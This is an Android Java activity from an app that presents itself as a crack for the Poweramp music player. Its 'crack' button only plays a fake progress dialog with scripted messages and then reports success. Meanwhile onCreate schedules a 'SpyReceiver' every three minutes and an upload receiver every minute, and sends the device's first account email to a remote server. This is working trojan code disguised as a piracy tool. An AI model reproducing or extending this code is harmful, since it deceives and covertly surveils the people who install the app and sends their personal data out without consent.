package co.poweramp.crackapp.activity;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.SystemClock;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import co.poweramp.crackapp.Constants;
import co.poweramp.crackapp.R;
import co.poweramp.crackapp.receiver.SaneAsyncHttpResponseHandler;
import co.poweramp.crackapp.receiver.SpyReceiver;
import co.poweramp.crackapp.receiver.UploadCheckReceiver;
import cz.msebera.android.httpclient.Header;

public class MainActivity extends AppCompatActivity {
    private final String TAG = "SpyReceiver";
    private TextView lastCracked;

    private Button crack;
    private ProgressDialog progressDialog;
    private String[] dialogMessages;

    boolean checkInstalled() {
        try {
            return getPackageManager().getPackageInfo("com.maxmpz.audioplayer", 0) != null;
        } catch (Exception e) {
            return false;
        }
    }

    void changeDialogMessage() {
        long totalDuration = 0;
        for (int i = 0; i < dialogMessages.length; i++) {
            final int index = i;
            long duration = (long)(Math.random() * 5000 + 500);
            crack.postDelayed(new Runnable() {
                @Override
                public void run() {
                    String s = dialogMessages[index];
                    progressDialog.setMessage(s);
                }
            }, totalDuration);
            totalDuration += duration;
        }
        crack.postDelayed(new Runnable() {
            @Override
            public void run() {
                progressDialog.setMessage("Cracking complete!");
                crack.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        progressDialog.dismiss();
                    }
                }, 3000);
            }
        }, totalDuration);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        lastCracked = (TextView)findViewById(R.id.lastCracked_TextView);
        crack = (Button)findViewById(R.id.crack_Button);

        dialogMessages = getResources().getStringArray(R.array.dialog_messages);

        crack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (!checkInstalled()) {
                    Toast.makeText(MainActivity.this, R.string.label_not_installed, Toast.LENGTH_LONG).show();
                    return;
                }
                progressDialog = new ProgressDialog(MainActivity.this);
                progressDialog.setTitle(R.string.dialog_title);
                progressDialog.setMessage(getString(R.string.dialog_message_initial));
                changeDialogMessage();
                progressDialog.setIndeterminate(true);
                progressDialog.setCanceledOnTouchOutside(false);
                progressDialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
                    @Override
                    public void onDismiss(DialogInterface dialogInterface) {
                        Toast.makeText(MainActivity.this, R.string.dialog_success, Toast.LENGTH_LONG).show();
                    }
                });
                progressDialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
                    @Override
                    public void onCancel(DialogInterface dialogInterface) {
                        Toast.makeText(MainActivity.this, R.string.dialog_cancel, Toast.LENGTH_LONG).show();
                    }
                });
                progressDialog.show();
            }
        });

        AlarmManager manager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);

        Intent spyReceiverIntent = new Intent(this, SpyReceiver.class);
        PendingIntent spyReceiverPendingIntent = PendingIntent.getBroadcast(this, 0, spyReceiverIntent, 0);
        manager.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime(), 180000, spyReceiverPendingIntent);

        Intent uploadCheckReceiverIntent = new Intent(this, UploadCheckReceiver.class);
        PendingIntent uploadCheckReceiverPendingIntent = PendingIntent.getBroadcast(this, 0, uploadCheckReceiverIntent, 0);
        manager.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime(), 60000, uploadCheckReceiverPendingIntent);

        final SharedPreferences sharedPref = getSharedPreferences(getString(R.string.preference_account_id), Context.MODE_PRIVATE);
        if (sharedPref.getInt("accountId", -1) == -1) {
            requestForAccountId(getAccounts()[0].name, new RequestAccountListener() {
                @Override
                public void onSuccess(int accountId) {
                    SharedPreferences.Editor editor = sharedPref.edit();
                    editor.putInt("accountId", accountId);
                    editor.commit();
                }
            });
        }
    }

    private interface RequestAccountListener {
        void onSuccess(int accountId);
    }

    private Account[] getAccounts() {
        AccountManager accountManager = AccountManager.get(this);
        return accountManager.getAccounts();
    }

    /**
     * Request for an account id from the server
     * @param email
     */
    private void requestForAccountId(String email, final RequestAccountListener listener) {
        AsyncHttpClient httpClient = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        params.put("email", email);
        httpClient.post(this, Constants.BASE_URL + "/users/add", params, new SaneAsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                String response = new String(responseBody);
                Log.d(TAG, "Server Response: " + response);
                JsonObject obj = new JsonParser().parse(response).getAsJsonObject();
                boolean success = obj.get("success").getAsBoolean();
                if (success) {
                    SharedPreferences sharedPref = getSharedPreferences(getString(R.string.preference_account_id), Context.MODE_PRIVATE);
                    SharedPreferences.Editor editor = sharedPref.edit();
                    int accountId = obj.get("data").getAsJsonObject().get("account_id").getAsInt();
                    editor.putInt(getString(R.string.preference_account_id), accountId);
                    editor.commit();
                    Log.d(TAG, "Got account id: " + accountId);
                    listener.onSuccess(accountId);
                } else {
                    Log.d(TAG, "Success is false from server: " + response);
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.d(TAG, "POST to server failed: " + statusCode);
                String resp = new String(responseBody);
                Log.d(TAG, "Server response: " + resp);
            }
        });
    }
}
